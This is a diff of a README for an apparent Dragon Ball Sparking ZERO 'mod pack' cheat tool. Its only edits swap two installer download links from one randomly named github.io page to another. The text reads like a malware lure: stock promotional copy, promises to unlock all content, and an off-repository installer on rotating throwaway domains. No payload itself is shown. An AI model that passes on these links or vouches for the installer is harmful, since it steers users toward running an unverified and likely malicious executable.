@@ -2,7 +2,7 @@
 
 Dragon Ball Sparking ZERO Ultimate Mod Pack is your definitive companion for enhancing and customizing your experience in the 2024 smash-hit fighting game. This comprehensive Windows desktop tool provides a suite of user-friendly features designed for offline single-player use, allowing you to experiment with gameplay, practice combos under different conditions, and access content faster. Whether you want to unlock all characters immediately or test powerful moves without resource constraints, this mod pack offers a safe and straightforward way to personalize your sessions.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Core Features
 
@@ -45,7 +45,7 @@ A: This is a lightweight Windows desktop application. It will run on any system 
 
 To get the latest version of the Dragon Ball Sparking ZERO Ultimate Mod Pack, please visit our official distribution page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Last Updated: October 2026. This tool is provided as-is for educational and entertainment purposes. Use responsibly and respect the game's terms of service for online play.*
